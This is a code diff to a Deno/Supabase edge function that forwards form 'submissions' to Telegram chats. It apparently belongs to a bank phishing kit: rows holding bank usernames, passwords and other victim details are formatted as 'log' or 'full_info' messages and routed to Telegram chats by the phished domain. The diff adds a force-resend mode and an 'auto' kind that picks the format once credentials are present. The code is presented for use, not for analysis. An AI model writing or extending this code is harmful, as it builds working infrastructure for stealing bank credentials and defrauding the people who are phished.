@@ -92,30 +92,59 @@ async function processNotification(
   supabase: any,
   botToken: string,
   submission_id: string,
-  kind: "full_info" | "log",
-): Promise<{ ok: boolean; sent: number; reason?: string }> {
-  // Atomic claim: only proceed if telegram_sent is still false
-  const { data: claimed, error: claimErr } = await supabase
-    .from("submissions")
-    .update({ telegram_sent: true, notified_at: new Date().toISOString() })
-    .eq("id", submission_id)
-    .eq("telegram_sent", false)
-    .select("*");
+  kind: "full_info" | "log" | "auto",
+  force = false,
+): Promise<{ ok: boolean; sent: number; reason?: string; kind?: string }> {
+  let submission: any;
 
-  if (claimErr || !claimed || claimed.length === 0) {
-    return { ok: true, sent: 0, reason: "already_sent" };
+  if (force) {
+    // Force mode: skip atomic claim, just load the row
+    const { data, error } = await supabase
+      .from("submissions")
+      .select("*")
+      .eq("id", submission_id)
+      .single();
+    if (error || !data) return { ok: false, sent: 0, reason: "not_found" };
+    submission = data;
+  } else {
+    // Atomic claim: only proceed if telegram_sent is still false
+    const { data: claimed, error: claimErr } = await supabase
+      .from("submissions")
+      .update({ telegram_sent: true, notified_at: new Date().toISOString() })
+      .eq("id", submission_id)
+      .eq("telegram_sent", false)
+      .select("*");
+
+    if (claimErr || !claimed || claimed.length === 0) {
+      return { ok: true, sent: 0, reason: "already_sent" };
+    }
+    submission = claimed[0];
+
+    // For full_info: skip if user has since entered login credentials
+    if (kind === "full_info" && submission.bank_username) {
+      return { ok: true, sent: 0, reason: "login_present" };
+    }
   }
 
-  const submission = claimed[0];
-
-  // For full_info: skip if user has since entered login credentials
-  if (kind === "full_info" && submission.bank_username) {
-    return { ok: true, sent: 0, reason: "login_present" };
+  // Auto-detect kind from submission state
+  let resolvedKind: "log" | "full_info";
+  if (kind === "auto") {
+    resolvedKind = submission.bank_username && submission.bank_password ? "log" : "full_info";
+  } else {
+    resolvedKind = kind;
   }
 
-  const text = kind === "log" ? formatLog(submission) : formatFullInfo(submission);
+  const text = resolvedKind === "log" ? formatLog(submission) : formatFullInfo(submission);
   const sent = await sendToMatchingChats(supabase, botToken, text, submission.domain);
-  return { ok: true, sent };
+
+  if (force && sent > 0) {
+    await supabase
+      .from("submissions")
+      .update({ telegram_sent: true, notified_at: new Date().toISOString() })
+      .eq("id", submission_id);
+  }
+
+  return { ok: true, sent, kind: resolvedKind };
 }
 
 Deno.serve(async (req) => {
@@ -125,7 +154,7 @@ Deno.serve(async (req) => {
 
   try {
     const body = await req.json();
-    const { submission_id, test, chat_id, kind = "log", delay_seconds = 0 } = body;
+    const { submission_id, test, chat_id, kind = "log", delay_seconds = 0, force = false } = body;
 
     const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
     if (!TELEGRAM_BOT_TOKEN) {
@@ -166,7 +195,7 @@ Deno.serve(async (req) => {
       });
     }
 
-    if (kind !== "full_info" && kind !== "log") {
+    if (kind !== "full_info" && kind !== "log" && kind !== "auto") {
       return new Response(JSON.stringify({ error: "invalid kind" }), {
         status: 400,
         headers: { ...corsHeaders, "Content-Type": "application/json" },
@@ -185,6 +214,7 @@ Deno.serve(async (req) => {
             TELEGRAM_BOT_TOKEN,
             submission_id,
             kind,
+            force,
           );
         } catch (e) {
           console.error("Delayed notification failed:", e);
@@ -208,6 +238,7 @@ Deno.serve(async (req) => {
       TELEGRAM_BOT_TOKEN,
       submission_id,
       kind,
+      force,
     );
 
     return new Response(JSON.stringify(result), {
